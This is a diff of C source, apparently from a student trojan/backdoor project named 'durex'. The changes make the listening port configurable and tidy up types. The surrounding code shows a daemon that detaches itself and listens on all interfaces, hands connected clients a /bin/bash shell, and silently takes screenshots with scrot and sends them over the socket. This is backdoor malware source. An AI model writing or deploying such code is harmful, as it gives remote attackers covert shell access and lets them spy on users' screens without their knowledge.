@@ -1,6 +1,6 @@
 #include "durex.h"
 
-bool	setup_deamon(t_connexion *connexion)
+bool	setup_deamon(t_connexion *connexion, uint16_t port)
 {
 	umask(0);
 	if (setsid() == -1)
@@ -25,7 +25,7 @@ bool	setup_deamon(t_connexion *connexion)
 
 	connexion->address.sin_family = AF_INET;
 	connexion->address.sin_addr.s_addr = INADDR_ANY;
-	connexion->address.sin_port = htons(4242);
+	connexion->address.sin_port = htons(port);
 
 	if (bind(connexion->master_socket, (struct sockaddr *)&connexion->address,
 		sizeof(connexion->address)) < 0)
@@ -88,7 +88,7 @@ static bool	new_client(t_connexion *connexion, t_users *users)
 	return (true);
 }
 
-void	spawn_shell(t_users *users, char **envp)
+static void	spawn_shell(t_users *users, char **envp)
 {
 	pid_t	pid = 0;
 	char	*shell[] = {"/bin/bash", NULL};
@@ -114,7 +114,7 @@ void	spawn_shell(t_users *users, char **envp)
 	}
 }
 
-void	screenshot(t_users *users, char **envp)
+static void	screenshot(t_users *users, char **envp)
 {
 	char		*screen[] = {"/usr/bin/scrot", "/tmp/test1.png", NULL};
 	char		img[4096] = {0};
@@ -123,7 +123,7 @@ void	screenshot(t_users *users, char **envp)
 	int			fd = 0;
 	struct stat	st;
 	size_t		img_size = 0;
-	size_t		ret_read = 0;
+	ssize_t		ret_read = 0;
 
 	int ret;
 
@@ -148,14 +148,14 @@ void	screenshot(t_users *users, char **envp)
 		perror("open");
 	if (stat("/tmp/test1.png", &st) == -1)
 		perror("stat");
-	img_size = st.st_size;
+	img_size = (size_t)st.st_size;
 	while (img_size > 0)
 	{
 		if ((ret_read = read(fd, &img, 4096)) == -1)
 			perror("read");
 		else
-			send(users->sd, &img, ret_read, 0);
-		img_size -= ret_read;
+			send(users->sd, &img, (size_t)ret_read, 0);
+		img_size -= (size_t)ret_read;
 	}
 	unlink("/tmp/test1.png");
 }
